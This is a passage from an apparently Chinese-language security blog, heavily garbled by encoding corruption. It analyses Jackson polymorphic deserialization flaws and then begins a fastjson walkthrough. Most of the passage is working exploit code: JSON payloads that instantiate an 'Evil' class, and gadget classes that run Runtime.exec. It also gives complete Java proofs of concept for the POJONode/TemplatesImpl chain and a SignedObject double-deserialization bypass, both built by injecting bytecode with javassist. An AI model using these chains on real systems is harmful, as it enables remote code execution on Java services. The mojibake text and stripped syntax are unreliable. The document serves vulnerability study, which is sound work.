System.out.println(jsonstring); Person2 p2 = objectMapper.readValue(jsonstring,Person2.class); System.out.println(p2); @JsonTypeInfoæ³¨è§£@JsonTypeInfoæ³¨è§£æ˜¯Jacksonå¤šæ€ç±»å‹ç»‘å®šçš„ä¸€ç§æ–¹å¼ï¼Œæ”¯æŒä¸‹é¢5ç§ç±»å‹çš„å–å€¼ï¼š @JsonTypeInfo(use = JsonTypeInfo.Id.NONE)@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM) JsonTypeInfo.Id.NONEç”¨äºæŒ‡å®šåœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¸åŒ…å«ä»»ä½•ç±»å‹æ ‡è¯†ï¼Œä¸ä½¿ç”¨è¯†åˆ«ç  package jackson;import com.fasterxml.jackson.databind.ObjectMapper;public class JSTest public static void main(String[] args) throws Exception Person2 person2 = new Person2(); person2.age = 123; person2.name = fakes0u1; Hacker[] hacker = new Hacker[2]; hacker[0] = new Hacker(); hacker[1] = new Hacker(); person2.object = hacker; ObjectMapper objectMapper = new ObjectMapper(); String jsonstring = objectMapper.writeValueAsString(person2); System.out.println(jsonstring); Person2 p2 = objectMapper.readValue(jsonstring,Person2.class); System.out.println(p2); package jackson;import com.fasterxml.jackson.annotation.JsonTypeId;import com.fasterxml.jackson.annotation.JsonTypeInfo;public class Hacker public String skill = moyu;class Person2 public String name = null; public int age = 0; @JsonTypeInfo(use = JsonTypeInfo.Id.NONE) public Object object; @Override public String toString() return String.format(Person2.age=%d,Person2.name=%s,%s,age,name,object == null ? null : object); è¾“å‡º name:fakes0u1,age:123,object:[skill:moyu,skill:moyu]Person2.age=123,Person2.name=fakes0u1,[skill=moyu, skill=moyu] å› ä¸ºæ˜¯ä¸ä½¿ç”¨è¯†åˆ«ç  æ‰€ä»¥è¾“å‡ºæ²¡æœ‰ä»€ä¹ˆä¸ä¸€æ · JsonTypeInfo.Id.CLASSä½¿ç”¨å®Œå…¨é™å®šç±»ååšè¯†åˆ« æˆ‘ä»¬ç›´æ¥å°†personç±»ä¸­çš„æ³¨é‡Šä¿®æ”¹ä¸ºJsonTypeInfo.Id.CLASS æŸ¥çœ‹è¾“å‡º name:fakes0u1,age:123,object:@class:jackson.Hacker,skill:moyuPerson2.age=123,Person2.name=fakes0u1,jackson.Hacker@5702b3b1 æˆ‘ä»¬å¯ä»¥çœ‹åˆ° åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ä¿¡æ¯ä¸­ å‡æœ‰å…·ä½“ç±»çš„ä¿¡æ¯ åœ¨Jacksonååºåˆ—åŒ–çš„æ—¶å€™å¦‚æœä½¿ç”¨äº†JsonTypeInfo.Id.CLASSä¿®é¥°çš„è¯ï¼Œå¯ä»¥é€šè¿‡@classçš„æ–¹å¼æŒ‡å®šç›¸å…³ç±»ï¼Œå¹¶è¿›è¡Œç›¸å…³è°ƒç”¨ã€‚ JsonTypeInfo.Id.MINIMAL_CLASSå½“æˆ‘ä»¬å°†objectçš„æ³¨é‡Šä¿®æ”¹ä¸ºJsonTypeInfo.Id.MINIMAL_CLASSæ—¶ è¾“å‡ºä¸º name:fakes0u1,age:123,object:@c:jackson.Hacker,skill:moyuPerson2.age=123,Person2.name=fakes0u1,jackson.Hacker@4b952a2d çœ‹èµ·æ¥å°±æ˜¯å°†ä¸Šé¢çš„@classçš„å½¢å¼ç»™ç®€å†™äº† JsonTypeInfo.Id.NAMEå°†æ³¨é‡Šä¿®æ”¹ä¸ºJsonTypeInfo.Id.NAMEå åºåˆ—åŒ–çš„è¾“å‡ºå˜ä¸º name:fakes0u1,age:123,object:@type:Hacker,skill:moyu å¤šå‡ºä¸€ä¸ª@type è¿™é‡Œå¹¶æ²¡æœ‰åƒä¸Šé¢çš„CLASSä¸€æ · ç»™å‡ºå…·ä½“åŒ…åå’Œç±»å åŒæ—¶åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¿˜ä¼šæŠ¥é”™ ä¹Ÿå°±æ˜¯è¯´ è¿™ä¸ªæ³¨é‡Šå¹¶ä¸é€‚ç”¨äºååºåˆ—åŒ–è¿‡ç¨‹ JsonTypeInfo.Id.CUSTOMè‡ªå®šä¹‰è¯†åˆ«ç ï¼Œç”±@JsonTypeIdResolverå¯¹åº”ï¼Œç”±ç”¨æˆ·æ¥è‡ªå®šä¹‰ å¹¶ä¸èƒ½ç›´æ¥ä½¿ç”¨ é€šè¿‡ä¸Šé¢çš„æµ‹è¯• æˆ‘ä»¬å‘ç°åœ¨ä½¿ç”¨JsonTypeInfo.Id.CLASSå’ŒJsonTypeInfo.Id.MINIMAL_CLASSä¿®é¥°Objectç±»å‹çš„å±æ€§æ—¶ ä¼šè§¦å‘Jacksonçš„ååºåˆ—åŒ– ååºåˆ—åŒ–ä¸­ç±»å±æ€§æ–¹æ³•çš„è°ƒç”¨å°±æ˜¯å¯¹jacksonä¸­å¤šæ€çš„ååºåˆ—åŒ–è¿‡ç¨‹è¿›è¡Œåˆ†æ ä½¿ç”¨DefaultTypingæˆ–è€…@JsonTypeInfoæ—¶éƒ½ä¼šè°ƒç”¨ç›¸å¯¹åº”çš„setteræ–¹æ³• Jacksonçš„ååºåˆ—åŒ–çš„è¿‡ç¨‹åˆ†ä¸ºä¸¤æ­¥ ç¬¬ä¸€æ­¥é€šè¿‡æ„é€ å‡½æ•°ç”Ÿæˆå®ä¾‹ ç¬¬äºŒæ­¥æ˜¯å¯¹å®ä¾‹è¿›è¡Œè®¾ç½®å±æ€§å€¼ å¯¹å…¶è¿›è¡Œè°ƒè¯• è·Ÿè¿›readValueæ–¹æ³•ï¼Œä¸€ç›´å¾€ä¸‹èµ° è·Ÿè¿›deserializeæ–¹æ³• å†è·Ÿè¿›vanillaDeserializeæ–¹æ³• è°ƒç”¨createUsingDefaultå‡½æ•° ä»è€Œè°ƒç”¨æŒ‡å®šç±»çš„æ— å‚æ„é€ å‡½æ•°æ¥ç”Ÿæˆç±»å®ä¾‹ è·Ÿè¿›ä¸€ä¸‹ è·Ÿè¿›callæ–¹æ³• callå‡½æ•°ä¸­è°ƒç”¨çš„æ–¹æ³•å¾ˆç†Ÿæ‚‰å§ï¼Œç”Ÿæˆå®ä¾‹ï¼Œæˆ‘ä»¬è·Ÿè¿›å» è°ƒç”¨äº†Personç±»çš„æ— å‚æ„é€ æ–¹æ³•ï¼Œä»è€Œå®Œæˆäº†beançš„å®ä¾‹åŒ– åœ¨å®Œæˆäº†ç±»çš„å®ä¾‹åŒ–ä¹‹å å°±éœ€è¦å¯¹ç±»ä¸­çš„å±æ€§è¿›è¡Œèµ‹å€¼ ä»¥é”®å€¼å¯¹çš„å½¢å¼è¿›è¡ŒåŒ¹é… ä»¥do whileå¾ªç¯çš„å½¢å¼å¯¹å…¶ä¸­çš„å±æ€§è¿›è¡Œèµ‹å€¼ è·Ÿè¿›ä¸€ä¸‹deserializeAndSetå‡½æ•° æ£€æŸ¥å±æ€§ç±»å‹éšåè·Ÿè¿›deserializeå‡½æ•°ï¼Œè¿™è¾¹å±æ€§æ˜¯nameæ‰€ä»¥è·Ÿè¿›çš„æ˜¯Stringç±»å‹çš„ å…ˆå¯¹å…¶è¿›è¡Œè§£æï¼Œè·å–nameçš„å†…å®¹ ç„¶ååˆ° setå¤„ï¼Œè¿›è¡Œsetterçš„åå°„è°ƒç”¨ åé¢å¯¹äºageå­—æ®µçš„åˆ†æä¹Ÿç±»ä¼¼ï¼Œå°±ä¸èµ˜è¿°äº† å¦‚æœè¯´æœ‰å‘ä¸Šé¢ä¾‹å­è¯´çš„é‚£æ ·ç±»çš„æœ‰ä¸€ä¸ªå­—æ®µæ˜¯Objectç±»å‹ï¼Œå¹¶ä¸”æœ‰è°ƒç”¨objectMapper.enableDefaultTypingæ–¹æ³•æˆ–è€…@JsonTypeInfoæ³¨è§£çš„æƒ…å†µï¼Œé‚£ä¹ˆå½“èµ°åˆ°Objectå¯¹è±¡ï¼Œæ¯”å¦‚æ˜¯sexå¯¹åƒï¼Œé‚£ä¹ˆåœ¨deserializeAndSetå‡½æ•°ä¸­å°±æ˜¯è°ƒç”¨deserializeWithTypeæ–¹æ³• è·Ÿè¿›å»ï¼Œè¿™é‡Œè¿”å›null äºæ˜¯ç»§ç»­ä¼šèµ°åˆ°deserializeTypedFromObjectæ–¹æ³•ï¼Œèµ°è¿›å» éšåä¼šå¯¹MySexå¯¹è±¡çš„æ„é€ å‡½æ•°è¿›è¡Œè°ƒç”¨ éšåä¼šå’Œä¸Šé¢ä¸€æ ·å¯¹MySexä¹‹ä¸­çš„å±æ€§è¿›è¡Œèµ‹å€¼ ä¼šè°ƒç”¨åˆ°setæ–¹æ³• jacksonååºåˆ—åŒ–æ¼æ´å‰ææ¡ä»¶æ»¡è¶³ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶ä¹‹ä¸€ å­˜åœ¨Jacksonååºåˆ—åŒ–æ¼æ´ ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šé¢æåˆ°è¿‡çš„ ä¼šè§¦å‘jsonä¸­çš„ç±»è§£æçš„æ³¨è§£æˆ–è€…å‡½æ•° è°ƒç”¨äº†ObjectMapper.enableDefaultTyping()å‡½æ•°ï¼› å¯¹è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»çš„å±æ€§ä½¿ç”¨äº†å€¼ä¸ºJsonTypeInfo.Id.CLASSçš„@JsonTypeInfoæ³¨è§£ï¼› å¯¹è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»çš„å±æ€§ä½¿ç”¨äº†å€¼ä¸ºJsonTypeInfo.Id.MINIMAL_CLASSçš„@JsonTypeInfoæ³¨è§£ï¼› æ¼æ´åŸç†å½“æˆ‘ä»¬ä½¿ç”¨çš„JacksonPolymorphicDeserializationé…ç½®æœ‰é—®é¢˜çš„æ—¶å€™ Jacksonååºåˆ—åŒ–ä¼šè°ƒç”¨å±æ€§æ‰€å±ç±»çš„æ„é€ å‡½æ•°å’Œsetteræ–¹æ³• æˆ‘ä»¬å°±å¯ä»¥åœ¨è¿™é‡Œåšæ–‡ç«  æˆ‘ä»¬å¯ä»¥ä»¥è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»çš„å±æ€§æ˜¯å¦ä¸ºObjectç±»åˆ†ä¸ºä¸¤ç§ æ— Objectæˆ‘ä»¬ä»æ„é€ å‡½æ•°å’Œsetteræ–¹æ³•å…¥æ‰‹ Personç±» package org.example;class Person public String name; public int age; public Person() throws Exception System.out.println(Person constructor); Runtime.getRuntime().exec(calc); public String getName() System.out.println(Person.getName()); return name; public void setName(String name) throws Exception System.out.println(Person.setName()); Runtime.getRuntime().exec(name); this.name = name; public int getAge() System.out.println(Person.getAge()); return age; public void setAge(int age) System.out.println(Person.setAge()); this.age = age; payload package org.example;import com.fasterxml.jackson.core.*;import com.fasterxml.jackson.databind.ObjectMapper;import java.io.File;public class Main public static void main(String[] args) throws Exception String json = ame\\:\\calc\\, \\age\\:30; ObjectMapper objectMapper = new ObjectMapper(); Person person = objectMapper.readValue(json, Person.class); System.out.println(person); æµ‹è¯•åä¼šæˆåŠŸå¼¹å‡ºä¸¤ä¸ªè®¡ç®—å™¨ æœ‰Objectå› ä¸ºObjectæ˜¯ä»»æ„ç±»å‹çš„çˆ¶ç±» å› æ­¤æ‰©å¤§äº†æˆ‘ä»¬çš„æ”»å‡»é¢ æˆ‘ä»¬åªéœ€è¦åœ¨ç›®æ ‡æœåŠ¡ç«¯ä¸­å­˜åœ¨çš„ä¸”æ„é€ å‡½æ•°æˆ–setteræ–¹æ³•å­˜åœ¨æ¼æ´çš„ç±»å³å¯è¿›è¡Œæ”»å‡»åˆ©ç”¨ ä¾‹å¦‚ å­˜åœ¨ä¸€ä¸ªæ¶æ„ç±»Evil åœ¨å…¶æ„é€ å‡½æ•°æˆ–è€…æ˜¯setteræ–¹æ³•ä¸­å­˜åœ¨ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ package org.example;public class Evil public String cmd; public void setCmd(String cmd) this.cmd = cmd; try Runtime.getRuntime().exec(calc); catch (Exception e) e.printStackTrace(); ç„¶åæˆ‘ä»¬å°†å…¶å†™åˆ°jsonä¸­ package org.example;import com.fasterxml.jackson.annotation.JsonTypeInfo;class Person2 public String name; public int age; public Person2() System.out.println(person æ„é€ å‡½æ•°); @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS) public Object object; package org.example;import com.fasterxml.jackson.databind.ObjectMapper;public class Test public static void main(String[] args) throws Exception ObjectMapper objectMapper = new ObjectMapper(); objectMapper.enableDefaultTyping(); String jsonstring = \\age\\:6, ame\\:\\fakes0u1\\,\\object\\:[\\org.example.Evil\\,\\cmd\\:\\calc\\]; Person2 p2 = objectMapper.readValue(jsonstring,Person2.class); System.out.println(p2); å¯ä»¥æˆåŠŸæ‰§è¡Œcalc æ³¨æ„ç‰ˆæœ¬è¾ƒä½çš„çœ‹CVE-2017-7525å’ŒCVE-2017-17485ï¼›å…·ä½“åˆ©ç”¨çœ‹å¼•ç”¨ï¼Œè¿™é‡Œå°±ä¸å…·ä½“åˆ†æå•¦ é€šæ€2.10è¿™é‡Œæµ‹è¯•ç”¨çš„ç‰ˆæœ¬æ˜¯2.13.3 åˆ©ç”¨Jacksonä¸­çš„PojoNode ä»–çš„toStringæ˜¯å¯ä»¥ç›´æ¥è§¦å‘ä»»æ„çš„getterçš„ è§¦å‘æ¡ä»¶å¦‚ä¸‹ ä¸éœ€è¦å­˜åœ¨è¯¥å±æ€§ getteræ–¹æ³•éœ€è¦æœ‰è¿”å›å€¼ å°½å¯èƒ½çš„åªæœ‰ä¸€ä¸ªgetter Userç±» package org.example;import java.io.Serializable;public class User implements Serializable public User() public Object getName() throws Exception Runtime.getRuntime().exec(calc); return asdas; public Object setName(String name) System.out.println(setname); return sadsad; Poc package org.example;import com.fasterxml.jackson.databind.node.POJONode;public class Test public static void main(String[] args) User user = new User(); POJONode jsonNodes = new POJONode(user); jsonNodes.toString(); æµ‹è¯•åæˆåŠŸå¼¹è®¡ç®—å™¨ TemplatesImplé“¾æˆ‘ä»¬çš„POJONodeæ˜¯ç»§æ‰¿ValueNodeçš„ ValueNodeæ˜¯ç»§æ‰¿BaseJsonNodeçš„ è€Œåœ¨BaseJsonNodeä¸­å­˜åœ¨ æ„å‘³ç€ æˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ ä¼šç»è¿‡è¿™ä¸ªwriteReplaceæ–¹æ³• è¿™ä¸ªæ–¹æ³•ä¼šå¯¹æˆ‘ä»¬çš„åºåˆ—åŒ–è¿‡ç¨‹è¿›è¡Œæ£€æŸ¥ ä»è€Œé˜»æ­¢æˆ‘ä»¬çš„åºåˆ—åŒ–è¿›ç¨‹ æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ é™¤è¿™ä¸ªæ–¹æ³•æ¥è·³è¿‡è¿™ä¸ªè¿‡ç¨‹ï¼Œä½†æ˜¯å‘ç° idea æ— æ³•ä¿®æ”¹æºç ï¼Œé‚£ä¹ˆç”¨ javassist è¿›è¡ŒåŠ¨æ€ä¿®æ”¹ package org.example;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;public class Test public static void main(String[] args) throws Exception ClassPool pool = ClassPool.getDefault(); ClassPool.getDefault().insertClassPath(new LoaderClassPath(Person.class.getClassLoader())); CtClass ctClass = ClassPool.getDefault().getCtClass(com.fasterxml.jackson.databind.node.BaseJsonNode); // è·å–åŸæ–¹æ³• CtMethod originalMethod = ctClass.getDeclaredMethod(writeReplace); // ä¿®æ”¹æ–¹æ³•å originalMethod.setName(Replace); // åŠ è½½ä¿®æ”¹åçš„ç±» ctClass.toClass(); CtClass clazz = pool.makeClass(sherlock); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[], clazz); constructor.setBody(java.lang.Runtime.getRuntime().exec(\\calc\\);); clazz.addConstructor(constructor); byte[][] bytes = new byte[][]clazz.toBytecode(); Templates templatesImpl = new TemplatesImpl(); setFieldValue(templatesImpl, _bytecodes, bytes); setFieldValue(templatesImpl, _name, fakes0u1); setFieldValue(templatesImpl, _tfactory, null); POJONode jsonNodes = new POJONode(templatesImpl); BadAttributeValueExpException exp = new BadAttributeValueExpException(null); Field val = Class.forName(javax.management.BadAttributeValueExpException).getDeclaredField(val); val.setAccessible(true); val.set(exp,jsonNodes); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr); objectOutputStream.writeObject(exp); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); objectInputStream.readObject(); private static void setFieldValue(Object obj, String field, Object arg) throws Exception Field f = obj.getClass().getDeclaredField(field); f.setAccessible(true); f.set(obj, arg); è°ƒè¯•å¯ä»¥çœ‹åˆ°TemplateImplé“¾çš„å¤§éƒ¨åˆ†ä»£ç è·Ÿfastjsoné‡Œé¢çš„ç›¸å…³é“¾ä»£ç å·®ä¸å¤šï¼Œå¼€å§‹è°ƒè¯• é€šè¿‡BadAttributeValueExpExceptionçš„readObjectæ–¹æ³•è¿›å…¥ è·Ÿè¿›ï¼Œåˆ°äº†BaseJsonNodeçš„toString è°ƒç”¨InternalNodeMapper.nodeToString è°ƒç”¨ObjectWriter.writeValueAsString(Object value) æœ€ç»ˆåœ¨serializeAsFieldä¸­è§¦å‘invoke è°ƒç”¨åˆ°TemplatesImpl.getOutputProperties è°ƒç”¨é“¾å¦‚ä¸‹ï¼ˆä¸€å¼ å›¾æˆªä¸ä¸‹æ¥ï¼‰ï¼š SignObjecté“¾åœ¨Templatesè¢«bançš„æƒ…å†µä¸‹ï¼Œæ‰“äºŒæ¬¡ååºåˆ—åŒ– package org.example;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.net.URI;import java.security.*;import java.util.Base64;public class Test public static void main(String[] args) throws Exception ClassPool pool = ClassPool.getDefault(); ClassPool.getDefault().insertClassPath(new LoaderClassPath(Person.class.getClassLoader())); CtClass ctClass = ClassPool.getDefault().getCtClass(com.fasterxml.jackson.databind.node.BaseJsonNode); // è·å–åŸæ–¹æ³• CtMethod originalMethod = ctClass.getDeclaredMethod(writeReplace); // ä¿®æ”¹æ–¹æ³•å originalMethod.setName(Replace); // åŠ è½½ä¿®æ”¹åçš„ç±» ctClass.toClass(); CtClass clazz = pool.makeClass(sherlock); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[], clazz); constructor.setBody(java.lang.Runtime.getRuntime().exec(\\calc\\);); clazz.addConstructor(constructor); byte[][] bytes = new byte[][]clazz.toBytecode(); TemplatesImpl templatesImpl = new TemplatesImpl(); setFieldValue(templatesImpl, _bytecodes, bytes); setFieldValue(templatesImpl, _name, fakes0u1); setFieldValue(templatesImpl, _tfactory, null); POJONode jsonNodes2 = new POJONode(templatesImpl); BadAttributeValueExpException exp2 = new BadAttributeValueExpException(null); Field val2 = Class.forName(javax.management.BadAttributeValueExpException).getDeclaredField(val); val2.setAccessible(true); val2.set(exp2,jsonNodes2); KeyPairGenerator keyPairGenerator; keyPairGenerator = KeyPairGenerator.getInstance(DSA); keyPairGenerator.initialize(1024); KeyPair keyPair = keyPairGenerator.genKeyPair(); PrivateKey privateKey = keyPair.getPrivate(); Signature signingEngine = Signature.getInstance(DSA); SignedObject signedObject = new SignedObject(exp2,privateKey,signingEngine); POJONode jsonNodes = new POJONode(signedObject); BadAttributeValueExpException exp = new BadAttributeValueExpException(null); Field val = Class.forName(javax.management.BadAttributeValueExpException).getDeclaredField(val); val.setAccessible(true); val.set(exp,jsonNodes); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr); objectOutputStream.writeObject(exp); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); objectInputStream.readObject(); private static void setFieldValue(Object obj, String field, Object arg) throws Exception Field f = obj.getClass().getDeclaredField(field); f.setAccessible(true); f.set(obj, arg); è°ƒè¯•è°ƒè¯•çš„æ—¶å€™å‰é¢éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä½†åé¢åå°„è°ƒç”¨çš„æ˜¯SignedObject.getObject()æ–¹æ³• SignedObject.getObjectä¹‹ä¸­ è¿™é‡Œè¿˜å­˜åœ¨ä¸€ä¸ªreadObject()æ–¹æ³• å¯ä»¥å°†æˆ‘ä»¬ä¼ è¿›æ¥çš„åœ¨è¿›è¡Œä¸€æ¬¡ååºåˆ—åŒ–ä»è€Œè¾¾åˆ°ç»•è¿‡çš„ç›®çš„ ç„¶åæ˜¯åˆä¸€éTemplatesImplé“¾ è·Ÿè¿›å»çš„è¯æœ€åä¼šèµ°åˆ°BadAttributeValueExpException.readObject()æ–¹æ³•ï¼Œè¿›è¡Œç¬¬äºŒæ¬¡ååºåˆ—åŒ– æ¥ä¸‹æ¥çš„æ­¥éª¤å’Œä¸Šé¢çš„TemplatesImplé“¾æ˜¯ä¸€æ ·çš„äº†","categories":["javaååºåˆ—åŒ–"]},{"title":"javaååºåˆ—åŒ–ä¹‹fastjson","path":"/2025/02/13/javaååºåˆ—åŒ–ä¹‹fastjson/","content":"å¼•ç”¨fastjson FastJson1.2.68RCEåŸç†è¯¦ç»†åˆ†æ fastjson 1.2.80 æ¼æ´æµ…æåŠåˆ©ç”¨payload FastJsonä¸åŸç”Ÿååºåˆ—åŒ– FastJsonä¸åŸç”Ÿååºåˆ—åŒ–(äºŒ) é«˜ç‰ˆæœ¬Fastjsonï¼šGetterè°ƒç”¨é™åˆ¶åŠç»•è¿‡æ–¹å¼æ¢ç©¶ é«˜ç‰ˆæœ¬Fastjsonåœ¨JavaåŸç”Ÿååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨ å‰è¨€mavenä¾èµ–ï¼šhttps://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24 dependency groupIdcom.alibaba/groupId artifactIdfastjson/artifactId version1.2.24/version/dependency FastJSON åœ¨åºåˆ—åŒ–æ—¶ï¼Œåˆ©ç”¨ Java çš„åå°„æœºåˆ¶ï¼Œé€šè¿‡è°ƒç”¨ JavaBean çš„ getter æ–¹æ³•è·å–å±æ€§å€¼ã€‚ åœ¨ååºåˆ—åŒ–æ—¶ï¼ŒFastJSON é€šè¿‡æ— å‚æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼Œå¹¶åˆ©ç”¨ setter æ–¹æ³•è®¾ç½®å±æ€§å€¼ åŸºç¡€æµç¨‹åˆ†æJSONObjectæ˜¯ä¸€ä¸ªMapç±» package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;public class JSONUnser public static void main(String[] args) throws Exception String s = \\param1\\:\\aaa\\,\\param2\\:\\bbb\\; //ä½¿ç”¨ fastjson çš„ JSON.parseObject æ–¹æ³•å°†JSONå­—ç¬¦ä¸² s è§£æä¸ºä¸€ä¸ª JSONObject å¯¹è±¡ JSONObject jsonObject = JSON.parseObject(s); System.out.println(jsonObject); System.out.println(jsonObject.get(param1)); é€šè¿‡ä¸Šè¿°ä»£ç å¯ä»¥åˆæ­¥äº†è§£åˆ°fastjsonçš„ä½œç”¨ Personç±» package org.example;public class Person private int age; private String name; public Person() System.out.println(Person constructor); public int getAge() System.out.println(getAge); return age; public void setAge(int age) System.out.println(setAge); this.age = age; public String getName() System.out.println(getName); return name; public void setName(String name) System.out.println(setName); this.name = name; æµ‹è¯•ä»£ç  package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;public class JSONUnser public static void main(String[] args) throws Exception String s = \\age\\ : 18, ame\\ : \\Sherlock\\; Person person = JSON.parseObject(s, Person.class); System.out.println(person.getName()); ä¸Šè¿°çš„ä»£ç æŠŠjsonå­—ç¬¦ä¸²è§£æä¸ºäº†ä¸€ä¸ªjavaå¯¹è±¡ï¼Œç„¶åæˆ‘ä»¬è¿˜å¯ä»¥æ­£å¸¸è°ƒç”¨å®ƒçš„æ–¹æ³•ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è°ƒç”¨äº†å“ªäº›æ–¹æ³•ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š å¯ä»¥çœ‹åˆ°é™¤äº†æœ€åæˆ‘ä»¬è‡ªå·±è°ƒç”¨çš„getNameæ–¹æ³•å¤–ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è°ƒç”¨setteræ–¹æ³•ç»™å¯¹è±¡è¿›è¡Œèµ‹å€¼ å†æ¥ä¸€ä¸ªä¾‹å­ï¼š package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;public class JSONUnser public static void main(String[] args) throws Exception //é€šè¿‡@typeå­—æ®µæŒ‡å®šä¸€ä¸ªç±»ï¼Œè®©å­—ç¬¦ä¸²æ ¹æ®å®ƒæ¥è¿›è¡Œè§£æ String s = \\@type\\ : \\org.example.Person\\, \\age\\ : 18, ame\\ : \\Sherlock\\; JSONObject jsonObject = JSON.parseObject(s); System.out.println(jsonObject); è¿è¡Œç»“æœå¦‚ä¸‹ï¼š ä»ç»“æœæˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è‡ªåŠ¨è°ƒç”¨äº†æ„é€ æ–¹æ³•ï¼Œè¿˜æœ‰setterå’Œgetteræ–¹æ³•æ¥è¿›è¡Œèµ‹å€¼å’Œè¾“å‡º ä¸Šè¿°ä»£ç é€šè¿‡æˆ‘ä»¬è¾“å…¥çš„ç±»çš„ä¸åŒè€Œä¼šè°ƒç”¨ç›¸å¯¹åº”çš„æ–¹æ³•ï¼Œè¿™å°±æ˜¯fastjsonçš„ä¸€ä¸ªåŠŸèƒ½ æ¥ä¸‹æ¥æˆ‘ä»¬æ¥è°ƒè¯•ä¸€ä¸‹ï¼Œæ¢ç©¶è¿™ä¸ªè¿‡ç¨‹ è·Ÿè¿›å» æˆ‘ä»¬å†ç»§ç»­è·Ÿè¿›parseæ–¹æ³•ä¸­ DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features); è¿™æ®µä»£ç åˆ›å»ºäº†ä¸€ä¸ª DefaultJSONParser å¯¹è±¡ï¼Œç”¨äºè§£æ JSON å­—ç¬¦ä¸²ã€‚DefaultJSONParser æ˜¯ fastjson åº“ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒç±»ï¼Œè´Ÿè´£å°† JSON å­—ç¬¦ä¸²è§£æä¸º Java å¯¹è±¡ PSï¼šå¯¹äºtokençš„åˆå§‹åŒ–å¯ä»¥æ¥åˆ°defaultJSONparserçš„æ„é€ å‡½æ•°æ¥çœ‹ å¾€ä¸‹èµ°åˆ°Object value = parser.parse();ï¼Œå¼€å§‹è¿›è¡Œè§£æå­—ç¬¦ä¸²ï¼Œè·Ÿè¿›å» public Object parse() return this.parse((Object)null); ç»§ç»­è·Ÿè¿›å»ï¼Œè¯¥æ–¹æ³•ä¼šå¯¹JSONå­—ç¬¦ä¸²ä¸­çš„æ¯ä¸€ä¸ªå­—ç¬¦éƒ½è¿›è¡Œè§£æï¼Œå¦‚ç¬¬ä¸€æ¬¡å°±æ˜¯å¯¹è¿›è¡Œè§£æ JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField)); æ²¡æœ‰ä¼ å…¥lexeræœ¬èº«ï¼Œæˆ–è€…æ˜¯ä»»ä½•å’Œæˆ‘ä»¬jsonå­—ç¬¦ä¸²å†…å®¹ç›¸å…³çš„ï¼Œæ–­å®šååºåˆ—åŒ–è¿˜æ²¡è¿›è¡Œï¼Œåˆ›å»ºä¸€ä¸ªç©ºçš„objectç”¨æ¥åç»­è£…è½½ç”Ÿæˆçš„JSONObjectå¯¹è±¡ åœ¨ä¸‹ä¸€è¡Œreturnä»£ç ä¸­ä¼šè°ƒç”¨æ¥æ”¶Mapçš„parseObjectæ–¹æ³•ï¼Œè¿™æ˜¯æœ€é‡è¦çš„åœ°æ–¹ï¼Œæˆ‘ä»¬è·Ÿè¿›å» ä¸€ç›´å¾€ä¸‹èµ°åˆ°è¿™é‡Œ è¯¥å¤„ä»£ç ç”¨æ¥è·³è¿‡ä»»æ„ä¸ªé€—å·ï¼Œä¸é‡è¦ å¾€ä¸‹èµ°å®šä¹‰äº†ä¸€ä¸ªkeyå˜é‡ï¼Œç”¨äºå­˜æ”¾jsonä¸­çš„é”®å ifåšåˆ¤æ–­ï¼Œå½“å‰æ˜¯åŒå¼•å·ï¼Œäºæ˜¯è¿›è¡Œæ“ä½œè¯»å–ä¸¤ä¸ªåŒå¼•å·ä¹‹é—´çš„å†…å®¹ è·å–åˆ°keyä¹‹åå‘ä¸‹èµ°ï¼Œæ¥åˆ°äº†å¯¹keyçš„åˆ¤æ–­ è¿™é‡ŒæŠŠä»£ç 